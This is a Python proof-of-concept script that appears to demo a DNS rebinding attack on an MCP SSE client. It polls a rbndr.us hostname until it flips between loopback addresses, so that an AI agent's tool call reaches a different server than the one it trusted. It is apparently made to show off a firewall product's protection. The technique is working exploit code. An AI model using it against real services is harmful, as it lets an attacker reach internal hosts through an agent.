import asyncio
import socket
import time
from mcp.client.sse import sse_client
from mcp.client.session import ClientSession

# 127.0.0.1 and 127.0.0.2
TARGET_HOST = "7f000001.7f000002.rbndr.us"
TARGET_URL = f"http://{TARGET_HOST}:8000/sse"

async def wait_for_ip(expected_ip: str, timeout: int = 60):
    """
    Forces the script to pause and poll the DNS server until the rbndr.us
    domain flips to the specific IP address we need for the next attack stage.
    This makes this demo deterministic.
    """
    print(f"[*] Waiting for DNS TTL expiration. Polling {TARGET_HOST} for {expected_ip}...")
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        try:
            current_ip = socket.gethostbyname(TARGET_HOST)
            if current_ip == expected_ip:
                print(f"[+] DNS successfully resolved to {current_ip}.")
                return
        except socket.gaierror:
            pass
        await asyncio.sleep(1)
        
    raise TimeoutError(f"DNS did not resolve to {expected_ip} within {timeout} seconds.")

async def run_agent(protected: bool):
    if protected:
        print("🛡️  Protected mode active: Deconvolute firewall will pin the IP address.")
        # TODO: Inject Deconvolute's secure_sse_client wrapper here
    
    # Stage 1: Ensure we connect to the public attacker server first
    await wait_for_ip("127.0.0.1")
    
    print(f"\n🚀 Agent connecting to discovery endpoint: {TARGET_URL}")
    
    async with sse_client(TARGET_URL) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as session:
            await session.initialize()
            
            print("[+] Session established. Trust built.")
            tools = await session.list_tools()
            print(f"[+] Discovered tools: {[t.name for t in tools.tools]}")
            
            # Stage 2: The Rebind Window
            print("\n[*] Agent needs the weather. Preparing tool execution payload...")
            print("[!] Malicious actor forces a DNS switch...")
            await wait_for_ip("127.0.0.2")
            
            # Stage 3: The Exploit
            print("\n🔥 DNS Rebound! Agent blindly firing tool execution...")
            try:
                # The SDK uses the URL string, triggering a new DNS lookup that hits our target
                result = await session.call_tool("get_weather", arguments={"location": "Amsterdam"})
                print(f"[*] Tool result received: {result}")
            except Exception as e:
                # We expect an httpx error here if the dummy server doesn't return perfect JSON-RPC, 
                # but the alert will still print on the target server!
                print(f"[*] Note: Execution raised an exception (expected if target is not an MCP server): {e}")

if __name__ == "__main__":
    import sys
    protected = "--protected" in sys.argv
    asyncio.run(run_agent(protected))